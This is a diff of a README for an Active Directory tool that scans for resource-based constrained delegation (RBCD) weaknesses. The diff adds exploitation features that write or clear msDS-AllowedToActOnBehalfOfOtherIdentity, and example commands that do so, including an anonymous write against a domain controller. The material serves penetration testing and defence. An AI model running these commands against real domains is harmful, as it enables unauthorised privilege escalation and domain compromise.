@@ -27,6 +27,9 @@ If any non-privileged user, group, or computer has these rights on a computer ob
 | Anonymous/Guest Check | ❌ | ✅ Checks if anonymous/guest can write to computer objects |
 | Domain Controller Flagging | ❌ | ✅ Highlights DC targets separately |
 | WriteAllProperties Detection | ❌ | ✅ Catches unrestricted WriteProperty |
+| RBCD Write (Exploitation) | ❌ | ✅ Write `msDS-AllowedToActOnBehalfOfOtherIdentity` via LDAP |
+| RBCD Cleanup | ❌ | ✅ Clear delegation after exploitation |
+| Anonymous RBCD Write | ❌ | ✅ Exploit via null/anonymous session |
 | Auth Methods | NTLM | NTLM, Simple, Kerberos, Anonymous |
 | Output Formats | CSV | CSV + JSON |
 | Concurrency | Parallel.ForEach | ThreadPoolExecutor |
@@ -38,7 +41,7 @@ The **anonymous/guest access check** was inspired by a real-world scenario where
 
 ```bash
 # Clone the repository
-git clone https://github.com/0xGunrunner/Get-RBCD-Threaded-py.git
+git clone https://github.com/YOUR_USERNAME/Get-RBCD-Threaded-py.git
 cd Get-RBCD-Threaded-py
 
 # Create a virtual environment (recommended)
@@ -84,6 +87,15 @@ python3 get-rbcd.py -d <DOMAIN> [options]
 | `--no-anon-check` | Skip the bonus anonymous access check |
 | `--no-color` | Disable colored terminal output |
 
+### RBCD Write/Clear Arguments
+
+| Argument | Description |
+|---|---|
+| `--write-rbcd` | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on target **(EXPLOITATION)** |
+| `--clear-rbcd` | Clear `msDS-AllowedToActOnBehalfOfOtherIdentity` on target **(CLEANUP)** |
+| `--target` | Target computer: DN, sAMAccountName, or dNSHostName |
+| `--delegate-from` | Principal to delegate from: sAMAccountName or SID (required for `--write-rbcd`) |
+
 ### Examples
 
 **Authenticated scan with NTLM:**
@@ -114,6 +126,28 @@ python3 get-rbcd.py -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i --pwdla
 
 ```bash
 python3 get-rbcd.py -d corp.local -u 'CORP\admin' -p 'aad3b435b51404eeaad3b435b51404ee:ntlmhash' --dc-ip 10.10.10.1 -i
+```
+
+**Write RBCD delegation (authenticated):**
+
+```bash
+python3 get-rbcd.py -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i \
+    --write-rbcd --target DC01 --delegate-from svc_account
+```
+
+**Write RBCD delegation (anonymous — the Operation Endgame scenario):**
+
+```bash
+python3 get-rbcd.py -d corp.local --dc-ip 10.10.10.1 -i \
+    --write-rbcd --target 'CN=DC01,OU=Domain Controllers,DC=corp,DC=local' \
+    --delegate-from CODY_ROY
+```
+
+**Cleanup — remove RBCD delegation after exploitation:**
+
+```bash
+python3 get-rbcd.py -d corp.local --dc-ip 10.10.10.1 -i \
+    --clear-rbcd --target DC01
 ```
 
 ## Sample Output
@@ -213,15 +247,22 @@ This tool is intended **exclusively** for:
 - **Security research and education** — in lab environments you own or control
 - **Defensive security** — identifying and remediating RBCD misconfigurations in your own environment
 
-### What This Tool Does NOT Do
+### Tool Capabilities & Safeguards
 
-This is a **read-only enumeration tool**. It performs standard LDAP queries only. It does **not**:
+By default, this tool **only performs read operations** (LDAP queries). It will not modify anything without explicit opt-in.
 
-- Exploit any vulnerability
-- Modify any Active Directory object or attribute
-- Write to `msDS-AllowedToActOnBehalfOfOtherIdentity`
-- Perform any RBCD attack, S4U2Self/S4U2Proxy, or DCSync
-- Create, delete, or alter accounts, groups, or permissions
+The `--write-rbcd` and `--clear-rbcd` flags enable **write operations** that modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on target computer objects. These operations:
+
+- Require explicit flags (`--write-rbcd` or `--clear-rbcd`) — never triggered automatically
+- Require interactive confirmation before execution (`YOUREALLYREALLYSURE` for write, `YES` for cleanup)
+- Do **not** perform the full RBCD attack — they only configure/remove the delegation; exploitation (S4U2Self/S4U2Proxy, DCSync) requires separate tools like impacket
+
+This tool does **not**:
+
+- Perform S4U2Self/S4U2Proxy ticket delegation
+- Execute DCSync, PSExec, or any post-exploitation
+- Create or delete any AD objects (users, computers, groups)
+- Modify any attribute other than `msDS-AllowedToActOnBehalfOfOtherIdentity`
 
 ### Legal Considerations
 
